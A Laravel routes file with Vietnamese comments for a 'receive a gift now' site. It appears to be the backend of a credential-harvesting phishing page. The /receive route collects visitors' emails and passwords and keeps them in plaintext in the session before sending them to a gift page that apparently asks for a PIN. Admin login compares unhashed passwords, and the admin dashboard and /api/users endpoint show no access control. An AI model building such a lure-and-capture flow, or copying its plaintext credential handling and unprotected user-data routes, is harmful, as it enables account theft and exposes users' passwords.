<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\UserController;
use App\Models\User;

// Sử dụng middleware force.https từ Kernel
Route::middleware(['force.https'])->group(function () {
    // Trang chính truy cập '/'
    Route::get('/', function () {
        return view('getItNow');
    });

    // Khi bấm nút "Nhận ngay", chuyển đến welcome
    Route::get('/welcome', function () {
        return view('welcome');
    });

    // ✅ SỬA LẠI route này để kiểm tra admin tại đây
    Route::post('/receive', function () {
        $email = request('email');
        $password = request('password');

        // ✅ Kiểm tra nếu là admin
        $admin = User::where('email', $email)
            ->where('password', $password) // không mã hóa
            ->where('is_admin', true)
            ->first();

        if ($admin) {
            return redirect()->secure('/admin');
        }

        // Nếu không phải admin → chuyển sang bước nhập PIN
        session([
            'email' => $email,
            'password' => $password,
        ]);
        return redirect()->secure('/nhanQua');
    })->name('login.step1');

    Route::get('/nhanQua', function () {
        return view('receiveGift');
    });

    Route::post('/', [UserController::class, 'store'])->name('login.store');
    Route::get('/admin', [UserController::class, 'adminDashboard'])->name('admin.dashboard');
    Route::get('/api/users', [UserController::class, 'getUsersJson']);
});
